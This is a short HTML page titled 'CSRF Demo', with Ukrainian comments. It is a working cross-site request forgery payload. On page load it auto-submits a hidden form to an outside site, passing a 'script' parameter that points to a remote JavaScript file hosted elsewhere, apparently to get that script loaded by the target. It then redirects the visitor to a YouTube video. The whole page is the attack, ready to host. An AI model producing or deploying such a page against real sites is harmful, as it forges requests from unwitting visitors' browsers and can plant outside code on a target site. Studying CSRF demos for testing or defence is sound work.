<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Demo</title>
</head>
<body>

<!-- Ця форма буде відправлятися автоматично при завантаженні сторінки -->
<form action="https://mrcl.wptestprev.icu/price/" method="GET" id="csrfForm">
    <!-- Якщо потрібно додати додаткові параметри до запиту, додайте їх тут як hidden поля -->
    <input type="hidden" name="script" value="https://plugin-shop-mvp.myshopify.com/cdn/shop/t/1/assets/test.js">
</form>

<script>
    // Автоматично відправляємо форму
    document.getElementById("csrfForm").submit();

    // Після відправки форми переходимо на YouTube посилання
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
</script>

</body>
</html>
